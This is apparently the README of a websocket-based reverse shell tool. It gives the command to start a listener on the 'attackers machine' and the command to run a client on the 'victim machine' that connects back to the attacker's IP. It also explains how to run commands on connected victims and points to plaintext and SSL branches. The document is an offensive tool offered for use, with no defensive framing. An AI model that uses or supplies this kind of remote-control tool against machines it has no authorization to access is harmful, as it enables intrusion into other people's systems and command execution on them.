```
  _                _                   _        _ _______ _       _____ 
 | |              | |                 | |      | |__   __| |     / ____|
 | |__   __ _  ___| | _____  ___   ___| | _____| |_ | |  | |    | (___  
 | '_ \ / _` |/ __| |/ / __|/ _ \ / __| |/ / _ \ __|| |  | |     \___ \ 
 | | | | (_| | (__|   <\__ \ (_) | (__|   <  __/ |_ | |  | |____ ____) |
 |_| |_|\__,_|\___|_|\_\___/\___/ \___|_|\_\___|\__||_|  |______|_____/ 
```

A websocket based reverse shell tool.

# To use:

On the attackers machine use the python server

`python3 hacksock-srv.py --host [Listening IP] --port [Listening Port] [--ssl]`

On the victim machine, either alter the source so no arguments are required or run the below:

`hacksock.exe [attackers IP] [port]`

Use `ls` to see all websocket connections.

Use `[id]:[Command]` to run commands i.e. if only one connection then `1:dir` will run dir on the first connection listed in `ls`.

Use `exit` to end the server or `1:exit` to end the client connection `1`.

# Bugs:

- Code was written in a field therefore full of bugs
- The server accepts multiple connections however functionality is hit and miss :P
- Feel free to use and improve. #fixmycode

# Branches:
- plaintext: Plain-text websocket client
- secure/main: SSL websocket client

The python server supports both as detailed using the `--ssl` switch.